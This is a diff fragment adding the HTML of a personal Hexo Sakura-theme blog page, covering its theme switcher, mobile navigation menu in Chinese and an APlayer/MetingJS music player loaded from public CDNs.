+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <!-- 实现换肤功能 -->
+
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+
+  <div class="changeSkin-gear no-select">
+
+  <div class="keys" id="setbtn"> 
+
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+
+   </span>
+
+  </div>
+
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">Mаксим0xGeekCat</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/0xGeekCat" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  转载
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            书单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  已读
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  未读
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
